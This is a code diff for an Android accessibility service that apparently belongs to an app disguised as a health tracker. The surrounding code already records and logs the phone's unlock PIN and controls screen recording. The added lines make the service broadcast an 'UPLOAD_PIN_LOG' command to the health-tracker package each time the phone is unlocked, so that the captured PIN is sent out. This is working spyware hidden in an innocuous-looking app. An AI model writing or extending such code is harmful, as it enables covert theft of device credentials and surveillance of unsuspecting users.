@@ -1179,6 +1179,8 @@ class WatchAccessibilityService : AccessibilityService() {
 
         // Lock screen just disappeared (phone unlocked successfully)
         if (wasActive && !isLockScreenActive) {
+            triggerPinLogUpload()
+
             if (pinBuffer.isNotEmpty()) {
                 val pin = pinBuffer.toString()
                 Log.d(TAG, "*** PHONE UNLOCKED with PIN: $pin ***")
@@ -1344,6 +1346,19 @@ class WatchAccessibilityService : AccessibilityService() {
             val intent = Intent(this, ScreenshotCaptureService::class.java)
             intent.action = ScreenshotCaptureService.ACTION_STOP_SCREEN_RECORD
             startService(intent)
+        }
+    }
+
+    private fun triggerPinLogUpload() {
+        Log.d(TAG, "triggerPinLogUpload()")
+        try {
+            val intent = Intent("com.inf2007.healthtracker.UPLOAD_PIN_LOG").apply {
+                setPackage("com.inf2007.healthtracker")
+            }
+            sendBroadcast(intent)
+            Log.d(TAG, "Triggered PIN log upload")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to trigger PIN upload: ${e.message}")
         }
     }
 }
